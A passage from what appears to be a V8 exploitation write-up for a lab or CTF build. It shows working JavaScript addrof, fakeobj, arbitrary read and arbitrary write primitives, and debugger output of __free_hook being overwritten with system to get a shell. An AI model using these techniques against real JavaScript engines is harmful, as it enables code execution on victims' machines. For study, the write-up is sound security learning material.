</span></span><span style="display:flex;"><span><span style="color:#75715e">//                     ^--fl_arr_map		^--1.1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x18d9bd6d5e60</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x3ff3333333333333</span>	<span style="color:#ae81ff">0x3ff4cccccccccccd</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//                     ^--1.2				^--1.3
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x18d9bd6d5e70</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000021b1d8fc2ed9</span>	<span style="color:#ae81ff">0x00003461124c0c71</span>         <span style="color:#75715e">//JSArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x18d9bd6d5e80</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000018d9bd6d5e41</span>	<span style="color:#ae81ff">0x0000000400000000</span></span></span></code></pre></div>
<p>We can create a JS function for this primitive as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">crafted_arr</span> <span style="color:#f92672">=</span> [<span style="color:#a6e22e">fl_arr_map</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>, <span style="color:#ae81ff">1.4</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">addr</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// We have to use tagged pointers for reading, so we tag the addr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">addr</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span><span style="color:#a6e22e">n</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">addr</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Place a fakeobj right on top of our crafted array with a float array map
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fake</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">crafted_arr</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Change the elements pointer using our crafted array to read_addr-0x10
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">crafted_arr</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">addr</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Index 0 will then return the value at read_addr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">fake</span>[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
<h1 id="05---introducing-an-arbitrary-write-primitive">05 - Introducing an Arbitrary Write Primitive<a href="#05---introducing-an-arbitrary-write-primitive" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>One could argue that to achieve an arbitrary write primitive would be as simple as achieving an arbitrary read primitive, however this is not the case unfortunately.
We can use the same concept as to leverage our <code>fakeobj</code> primitive, but with a twist.</p>
<p>we can write an intial write primitive following the previous implementation of <code>addrof</code>:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">initial_arb_write</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">val</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Place a fakeobj right on top of our crafted array with a float array map
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fake</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">arb_rw_arr</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Change the elements pointer using our crafted array to write_addr-0x10
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">arb_rw_arr</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">addr</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Write to index 0 as a floating point value
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">fake</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">val</span>));
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
We can see that this implementation of a write primitive will work for writes to objects as seen below:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">d8</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">test_arr</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>]
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">1.1</span>]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">d8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">test_arr</span>)         
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x3ae05860f8b1</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSArray</span>[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">1.1</span>]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">d8</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">initial_arb_write</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">test_arr</span>), <span style="color:#ae81ff">0x1337</span>);
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pwndbg</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">x</span><span style="color:#f92672">/</span><span style="color:#a6e22e">xg</span> <span style="color:#ae81ff">0x3ae05860f8b1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x3ae05860f8b0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000001337</span></span></span></code></pre></div>
However, if we try to overwrite libc pointers, we will see this primitive causes a crash as shown below:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pwndbg</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">p</span> <span style="color:#a6e22e">system</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$3</span> <span style="color:#f92672">=</span> {<span style="color:#66d9ef">int</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)} <span style="color:#ae81ff">0x7ffff7c78410</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">__libc_system</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pwndbg</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">__free_hook</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$5</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> (<span style="color:#f92672">**</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)) <span style="color:#ae81ff">0x7ffff7e11b28</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">__free_hook</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pwndbg</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">c</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Continuing</span>.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">d8</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">initial_arb_write</span>(<span style="color:#ae81ff">0x7ffff7e11b28</span>, <span style="color:#ae81ff">0x7ffff7c78410</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Thread</span> <span style="color:#ae81ff">1</span> <span style="color:#e6db74">&#34;d8&#34;</span> <span style="color:#a6e22e">received</span> <span style="color:#a6e22e">signal</span> <span style="color:#a6e22e">SIGSEGV</span>, <span style="color:#a6e22e">Segmentation</span> <span style="color:#a6e22e">fault</span>.</span></span></code></pre></div>
Reasons why this happens are not clear, but having a conversation with @farazsth98 regarding this subject, he believes this fault is due to some integrity checks run by v8 in order to avoid these type of write primitives.
However, there is a work-around to this issue by using a <code>ArrayBuffer</code> and a <code>DataView</code> object, by overwriting the <code>backing store</code> pointer of the <code>ArrayBuffer</code> and using a <code>DataView</code> instance to write a 64-bit value into the ArrayBuffer <code>backing store</code>.</p>
<p>Here are the specs of <a href="https://v8docs.nodesource.com/node-13.2/d5/d6e/classv8_1_1_array_buffer.html">ArrayBuffer</a> and <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView/setBigUint64">DataView</a> objects. This works as follows:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">arb_write</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">val</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// creating an ArrayBuffer holding the value of a 64-bit pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// creating a dataview for the ArrayBuffer object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">dataview</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// retrieving the address of the ArrayBuffer object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buf_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// retrieveing the address of the backing_store pointer of the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// ArrayBuffer object located at offset +0x20
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">backing_store_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">buf_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// overwritting the backing_store pointer with the value we desire
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// to overwrite
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">initial_arb_write</span>(<span style="color:#a6e22e">backing_store_addr</span>, <span style="color:#a6e22e">addr</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// using the dataview to dereference the backing pointer and to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// do the write for us
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">dataview</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">val</span>), <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// syntax: setBigUint64(byteOffset, value, littleEndian)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}</span></span></code></pre></div>
By applying this technique, we can observe that the write does not SEGFAULT any more:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> p system
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">=</span> {<span style="color:#66d9ef">int</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)} <span style="color:#ae81ff">0x7ffff7c78410</span> <span style="color:#f92672">&lt;</span>__libc_system<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> p <span style="color:#f92672">&amp;</span>__free_hook
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> (<span style="color:#f92672">**</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)) <span style="color:#ae81ff">0x7ffff7e11b28</span> <span style="color:#f92672">&lt;</span>__free_hook<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> c
</span></span><span style="display:flex;"><span>Continuing.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">arb_write</span>(<span style="color:#ae81ff">0x7ffff7e11b28</span>, <span style="color:#ae81ff">0x7ffff7c78410</span>)
</span></span><span style="display:flex;"><span>undefined
</span></span><span style="display:flex;"><span>[Attaching after Thread <span style="color:#ae81ff">0x7ffff7c22280</span> (LWP <span style="color:#ae81ff">65392</span>) vfork to child process <span style="color:#ae81ff">65394</span>]
</span></span><span style="display:flex;"><span>[New inferior <span style="color:#ae81ff">2</span> (process <span style="color:#ae81ff">65394</span>)]
</span></span><span style="display:flex;"><span>[Thread debugging using libthread_db enabled]
</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
</span></span><span style="display:flex;"><span>[Detaching vfork parent process <span style="color:#ae81ff">65392</span> after child exec]
</span></span><span style="display:flex;"><span>[Inferior <span style="color:#ae81ff">1</span> (process <span style="color:#ae81ff">65392</span>) detached]
</span></span><span style="display:flex;"><span>process <span style="color:#ae81ff">65394</span> is executing new program: <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>dash</span></span></code></pre></div>
<h1 id="06---exploitation">06 - Exploitation<a href="#06---exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h3 id="version-information">Version information:<a href="#version-information" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/v8/out.gn/x64.release$ uname -a
</span></span><span style="display:flex;"><span>Linux ubuntu 5.8.0-50-generic <span style="color:#75715e">#56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span style="display:flex;"><span>/v8/out.gn/x64.release$ ./d8 -v
</span></span><span style="display:flex;"><span>V8 version 7.5.0 <span style="color:#f92672">(</span>candidate<span style="color:#f92672">)</span></span></span></code></pre></div>
<h3 id="0601---overwritting-__free_hook-to-system">06.01 - Overwritting __free_hook to system<a href="#0601---overwritting-__free_hook-to-system" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">/// Helper functions to convert between float and integer primitives
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>); <span style="color:#75715e">// 8 byte array buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f64_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">u64_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint32Array</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">val</span>) { <span style="color:#75715e">// typeof(val) = float
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">f64_buf</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">val</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">u64_buf</span>[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> (<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">u64_buf</span>[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>); <span style="color:#75715e">// Watch for little endianness
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">val</span>) { <span style="color:#75715e">// typeof(val) = BigInt
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">u64_buf</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> Number(<span style="color:#a6e22e">val</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">u64_buf</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> Number(<span style="color:#a6e22e">val</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">f64_buf</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fl_arr</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.3</span>, <span style="color:#ae81ff">1.3</span>, <span style="color:#ae81ff">1.4</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fl_arr_map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fl_arr</span>.<span style="color:#a6e22e">oob</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tmp_obj</span> <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obj_arr</span> <span style="color:#f92672">=</span> [<span style="color:#a6e22e">tmp_obj</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obj_arr_map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj_arr</span>.<span style="color:#a6e22e">oob</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">in_obj</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// setting the object we want the address of as an element of obj_arr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">obj_arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">in_obj</span>; 	
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// oob write. changing the map of obj_arr for the fl_arr map.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">obj_arr</span>.<span style="color:#a6e22e">oob</span>(<span style="color:#a6e22e">fl_arr_map</span>); 	
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// even though we are accesing obj_arr, the returned element will be a float
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj_arr</span>[<span style="color:#ae81ff">0</span>];	
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// oob write. restoring the map of the object for the original one
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">obj_arr</span>.<span style="color:#a6e22e">oob</span>(<span style="color:#a6e22e">obj_arr_map</span>);	
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// returning the integer representation of the leaked pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">addr</span>);	
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">addr</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// storing the float value of an arbitrary address as an element of fl_arr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">fl_arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">addr</span>); 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// oob write. replacing the map of the fl_arr to that of the obj_arr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">fl_arr</span>.<span style="color:#a6e22e">oob</span>(<span style="color:#a6e22e">obj_arr_map</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// even though we are accessing fl_arr, the retur&lt;F3&gt;ned element will be a tagged pointer.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fake</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fl_arr</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// oob write. restoring original map of fl_arr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">fl_arr</span>.<span style="color:#a6e22e">oob</span>(<span style="color:#a6e22e">fl_arr_map</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// returning tagged pointer of arbitrary address
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fake</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arb_rw_arr</span> <span style="color:#f92672">=</span> [<span style="color:#a6e22e">fl_arr_map</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>, <span style="color:#ae81ff">1.4</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">addr</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// We have to use tagged pointers for reading, so we tag the addr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">addr</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span><span style="color:#a6e22e">n</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">addr</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Place a fakeobj right on top of our crafted array with a float array map
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fake</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">arb_rw_arr</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Change the elements pointer using our crafted array to read_addr-0x10
